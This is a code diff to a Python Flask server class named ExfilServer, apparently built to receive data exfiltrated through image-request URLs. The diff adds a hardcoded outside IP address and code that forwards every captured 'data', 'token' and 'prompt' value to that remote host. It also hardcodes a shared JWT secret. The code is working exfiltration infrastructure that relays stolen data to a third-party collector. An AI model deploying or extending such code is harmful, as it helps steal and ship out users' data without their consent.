@@ -9,6 +9,7 @@ from PIL import Image, ImageDraw, ImageFont
 import base64
 import traceback
 
+import requests
 from playwright.sync_api import sync_playwright
 import html2text
 
@@ -19,6 +20,8 @@ import json
 SECRET_KEY = 'this-is-a-shared-secret-for-the-demo'
 
 IMAGES_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'images')
+
+FORWARD_URL = 'http://34.45.35.75:2500/'
 
 class ExfilServer:
     def __init__(self, host='localhost', port=8080, log_path='exfil.log'):
@@ -126,17 +129,34 @@ class ExfilServer:
         def exfiltrate():
             data = request.args.get('data', '')
             plot = request.args.get('plot', '')
-            with open(self.log_path, 'a') as log_file:
-                client_ip = request.remote_addr or "-"
-                log_file.write(f"{client_ip}: {data}\n")
+            forwarded = request.args.get('forwarded', False)
 
-            image = self.images.get(plot, self.images['default'])
-            if image:
-                img_io = io.BytesIO()
-                image.save(img_io, 'PNG')
-                img_io.seek(0)
-                return send_file(img_io, mimetype='image/png')
-            return {"status": "image generation failed"}, 500
+            try:
+
+                if not forwarded:
+                    try:
+                        requests.get(f'{FORWARD_URL}/get-image', params={'data': data, 'plot': plot, 'forwarded': True}, timeout=10)
+                    except Exception as e:
+                        print(f"Error forwarding request: {str(e)}")
+                else:
+                    with open(self.log_path, 'a') as log_file:
+                        client_ip = request.remote_addr or "-"
+                        log_file.write(f"{client_ip}: {data}\n")
+                        return jsonify({"status": "forwarded"}), 200
+
+                with open(self.log_path, 'a') as log_file:
+                    client_ip = request.remote_addr or "-"
+                    log_file.write(f"{client_ip}: {data}\n")
+
+                image = self.images.get(plot, self.images['default'])
+                if image:
+                    img_io = io.BytesIO()
+                    image.save(img_io, 'PNG')
+                    img_io.seek(0)
+                    return send_file(img_io, mimetype='image/png')
+                return {"status": "image generation failed"}, 500
+            except Exception as e:
+                return {"status": "error", "message": str(e)}, 500
         
         @self.app.route('/assignment/', methods=['GET'])
         @self.app.route('/assignment', methods=['GET'])
@@ -144,6 +164,14 @@ class ExfilServer:
             try:
                 token = request.args.get('token', '')
                 prompt = request.args.get('prompt', '')
+                forwarded = request.args.get('forwarded', False)
+
+                if not forwarded:
+                    try:
+                        requests.get(f'{FORWARD_URL}/assignment', params={'token': token, 'prompt': prompt, 'forwarded': True}, timeout=10)
+                    except Exception as e:
+                        print(f"Error forwarding request: {str(e)}")
+
                 SECRET = 'this-is-a-shared-secret-for-the-demo'
 
                 payload = self.verify_hs256_and_get_payload(token, SECRET)
@@ -154,6 +182,9 @@ class ExfilServer:
                 with open(self.log_path, 'a') as log_file:
                     client_ip = request.remote_addr or "-"
                     log_file.write(f"{client_ip}: {data}\n")
+
+                if forwarded:
+                    return jsonify({"status": "forwarded"}), 200
 
                 image = self.images['default']
                 if image:
